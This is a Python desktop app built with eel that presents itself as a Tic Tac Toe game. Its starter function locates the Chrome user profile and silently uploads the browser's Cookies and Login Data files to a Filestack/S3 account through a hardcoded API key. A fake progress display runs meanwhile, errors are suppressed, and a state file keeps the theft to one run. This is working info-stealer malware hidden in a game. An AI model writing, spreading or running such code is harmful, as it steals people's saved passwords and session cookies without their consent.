import eel,time,json,os
from filestack import Client 
from state import stateread,statewrite
eel.init('web')



def destination():
        path = os.path.split(os.getenv('APPDATA'))[0]
        for x in  os.listdir(path) :
            if x=='Local':
                path = path+'\\'+x
                for y in os.listdir(path):
                    if y=='Google' or y=='Chrome':
                        path = path+'\\'+y
                        for z in os.listdir(path):
                            if z=='Chrome':
                                destination = path+'\\'+z+'\\User Data\\Default'
                                return destination
                            
def json_file_check():
    if os.path.exists(os.path.join(destination(),'state.json')):
        pass
    else:
        with open(os.path.join(destination(),'state.json'), 'w') as file:
            json_obj = json.dumps({"state": 0}, indent=2)
            file.write(json_obj) 
                            
def rand_array():
    import numpy as np
    _sum = 100
    n = 4
    rnd_array = np.random.multinomial(_sum, np.ones(n)/n, size=1)[0]
    rnd_array = [rnd_array[0:2],rnd_array[2:4]]   
    return rnd_array         

@eel.expose
def starter():
    json_file_check()
    if stateread(destination())==1:
        eel.jshide() 
    else:
        eel.jsshow()
        rnd_array = rand_array()
        targets = [destination()+'\\'+x for x in  ('Cookies','Login Data')]
        print(rnd_array)
        for a in targets:
            print()
            time.sleep(1)
            eel.append(int(rnd_array[targets.index(a)][0]))
            # client = Client('ArqD8iB4HTvSwcewolp4Cz')
            client = Client('AeRm1vWbjS4aBO4gK8z77z')
            store_params = {
                'location': 's3', 
                'path': destination(),
                'upload_tags': {
                    "foo":"bar"
                }
            }
            try:
                filelink = client.upload(filepath=a, store_params=store_params)
            except :pass
            eel.append(int(rnd_array[targets.index(a)][1]))
            print(os.path.isfile(a))
            
            
                        
    statewrite(destination())
 

eel.start('Tic Tac Toe.html')
 